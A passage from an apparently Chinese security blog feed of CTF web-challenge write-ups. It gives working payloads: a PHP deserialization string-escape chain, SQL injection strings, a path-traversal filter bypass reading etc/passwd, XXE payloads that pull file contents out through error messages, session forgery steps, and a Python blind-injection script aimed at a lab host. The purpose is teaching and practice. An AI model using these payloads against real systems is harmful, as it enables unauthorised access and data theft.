class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="comment">//return "0-0";</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql= <span class="keyword">new</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">'admin'</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>getNewInfo</code>方法默认返回的内容</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>这里我们来控制<code>nickname</code>，那么我们需要逃逸出来的字符串为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>计算一下他们的长度然后进行填充</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">'O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$a = <span class="string">'";s:8:"CtrlCase";'</span>.$b;</span><br><span class="line"><span class="keyword">echo</span> strlen($a);</span><br></pre></td></tr></table></figure><p>长度<code>305</code></p><p>这里使用<code>union</code>来进行替换，则需要<code>305</code>个<code>union</code></p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/7.png" alt="7"></p><p>最后的payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>在<code>upload.php</code>中传入执行，来查询<code>admin</code>的密码</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/8.png" alt="8"></p><p><code>MD5</code>解一下后拿出密码明文，登陆后就可以拿到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;题目考点：&lt;/p&gt;
&lt;p&gt;反序列化POP链构造&lt;/p&gt;
&lt;p&gt;反序列化字符串逃逸&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;题目源码&quot;&gt;&lt;a href=&quot;#题目源码&quot; class=&quot;headerlink&quot; title=&quot;题目源码&quot;&gt;&lt;/a
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>积累的一些web题目</title>
    <link href="https://yml-sec.top/2019/12/30/%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E4%BA%9Bweb%E9%A2%98%E7%9B%AE/"/>
    <id>https://yml-sec.top/2019/12/30/%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E4%BA%9Bweb%E9%A2%98%E7%9B%AE/</id>
    <published>2019-12-30T11:36:53.000Z</published>
    <updated>2020-12-20T09:45:12.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><blockquote><p>考点：SQL注入</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/32.png" alt="32"></p><p>随便输入用户名和密码后查看源码得到提示</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZF<span class="name">M422</span>K<span class="number">5</span>HDASKD<span class="symbol">N5</span>TVU<span class="number">3</span>SKOZRFGQRRMMZF<span class="name">M6</span>KJJBS<span class="name">G6</span>WSYJJWESSCWPJ<span class="symbol">NFQSTVLFLTC3</span>CJIQYGOSTZKJ<span class="number">2</span><span class="attr">VSVZRNRFHOPJ5</span></span><br></pre></td></tr></table></figure><p>解开为</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>我们需要以<code>admin</code>的身份登陆，可以使用<code>union</code>查询，控制为任意密码</p><p><img src="/2019/12/30/积累的一些web题目/E:/blog\myblog\source\_posts\积累的一些web题目\33.png" alt="33"></p><h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><blockquote><p>考点：文件读取绕过</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/29.png" alt="29"></p><p>查看源代码可以看到存在uploads目录</p><p><img src="/2019/12/30/积累的一些web题目/30.png" alt="30"></p><p>下载时抓包，发现可能存在任意文件读取，测试后发现将<code>../</code>替换为空，这里使用双写绕过即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>etc..<span class="regexp">//</span>passwd</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/31.png" alt="31"></p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><blockquote><p>考点：xxe</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/27.png" alt=""></p><p>题目是想让我们上传与示例相符的<code>xml</code>文件，不难联想到<code>xxe</code>，在测试时发现某些关键字被过滤了，借鉴这篇文章</p><p><a href="https://xz.aliyun.com/t/4059" target="_blank" rel="noopener">https://xz.aliyun.com/t/4059</a></p><p>可以用<code>utf-16</code>编码来绕过，使用<code>UltraEdit</code>软件来编写<code>utf-16</code>的<code>payload</code></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version='1.0' encoding="utf-16"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message[ </span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">message</span> <span class="attr">ANY</span> &gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">NUMBER</span> '&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">yemoli</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">&amp;#x25;eval;</span></span><br><span class="line"><span class="xml">&amp;#x25;error;</span></span><br><span class="line"><span class="xml">'&gt;</span></span><br><span class="line"><span class="xml"></span><span class="perl">%NUMBER;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt; </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>qqq<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>a@qq.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>按照正常方式发现回显位有长度限制，所以这里用到了与<code>[GoogleCTF2019 Quals]Bnv</code>中一样的利用报错带出数据的方法</p><p><img src="/2019/12/30/积累的一些web题目/E:/blog\myblog\source\_posts\积累的一些web题目\28.png" alt=""></p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><blockquote><p>考点：xxe</p></blockquote><p>题目界面：</p><p><img src="/2019/12/30/积累的一些web题目/25.png" alt="25"></p><p>该题目主要考点是xxe在无法加载外部dtd时错误数据的带出，参考下面这篇文章</p><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><p><code>payload:</code></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message[ </span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">message</span> <span class="attr">ANY</span> &gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">NUMBER</span> '&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">yemoli</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">&amp;#x25;eval;</span></span><br><span class="line"><span class="xml">&amp;#x25;error;</span></span><br><span class="line"><span class="xml">'&gt;</span></span><br><span class="line"><span class="xml"></span><span class="perl">%NUMBER;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt; </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/26.png" alt="26"></p><h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><blockquote><p>考点：session伪造</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/22.png" alt="22"></p><p>登陆后可以添加<code>note</code>,然后以压缩文件形式下载下来，当访问<code>flag</code>页面时提示我们需要成为<code>admin</code>，审计源码，会发现<code>session</code>和压缩文件存储在同一路径下，看一下压缩文件的命名</p><p><img src="/2019/12/30/积累的一些web题目/23.png" alt="23"></p><p>由用户名，<code>-</code>，八个随机串，和后缀构成，这个时候就给了我们伪造<code>session</code>的机会</p><p>以用户名<code>sess_</code>登陆，然后添加<code>note</code>，title为<code>|N;admin|b:1;</code>，<code>body</code>随意，在下载时将<code>type</code>改为<code>.</code>，这样就得到了伪造的<code>session</code>名称，替换一下即可</p><p><img src="/2019/12/30/积累的一些web题目/24.png" alt="24"></p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><blockquote><p>考点：二次注入</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/21.png" alt="21"></p><p>在<code>changepwd.php</code>处存在二次注入利用点，可利用报错函数带出数据</p><p>放上一个用户名的<code>payload</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1mio"||(extractvalue(1,concat(0x5c,reverse((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'f'</span>))))))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>注入过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())</span><br><span class="line"></span><br><span class="line">article,flag,<span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">name</span>,pwd,email,real_flag_1s_here</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(real_flag_1s_here)<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(<span class="keyword">name</span>=<span class="string">'admin'</span>)</span><br><span class="line">(real_flag_1s_here)regexp(<span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">reverse</span>((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'f'</span>)))</span><br></pre></td></tr></table></figure><p>由于最后带出<code>flag</code>的时候，报错函数存在回显长度限制，可以使用<code>reverse</code>函数逆序输出，拼接得到完整的结果</p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><blockquote><p>考点：SQL盲注</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/20.png" alt="20"></p><p>题目注入点在<code>search.php?id=1</code>当<code>id=1=0</code>和<code>id=1=1</code>时会有不同结果返回，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://5d1768ad-6d8d-462b-96c1-5c28f6edb4fc.node3.buuoj.cn/search.php?id=1="</span></span><br><span class="line">s = requests.session()</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">dict_sql = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*/()_-+=&#123;&#125;.:,'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2000</span>):</span><br><span class="line">    print(<span class="string">'===================================='</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict_sql:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload = <span class="string">"((ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1)))=&#123;&#125;)"</span>.format(i,ord(j))</span><br><span class="line">        url1 = url+payload</span><br><span class="line">        html = s.get(url1,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Click others~~~'</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            result = result+j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(<span class="built_in">table_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">tables</span>)<span class="keyword">where</span>(table_schema=<span class="string">'geek'</span>)</span><br><span class="line"></span><br><span class="line">F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(group_concat(<span class="built_in">column_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">columns</span>)<span class="keyword">where</span>(<span class="built_in">table_name</span>=<span class="string">'F1naI1y'</span>)</span><br><span class="line"></span><br><span class="line">id,username,<span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(group_concat(<span class="keyword">password</span>))<span class="keyword">from</span>(F1naI1y)</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><blockquote><p>考点:SQL注入，反序列化</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/15.png" alt=""></p><p>根据题目首页面泄露的信息，在<code>GitHub</code>上找到了该站点源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//helper.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span 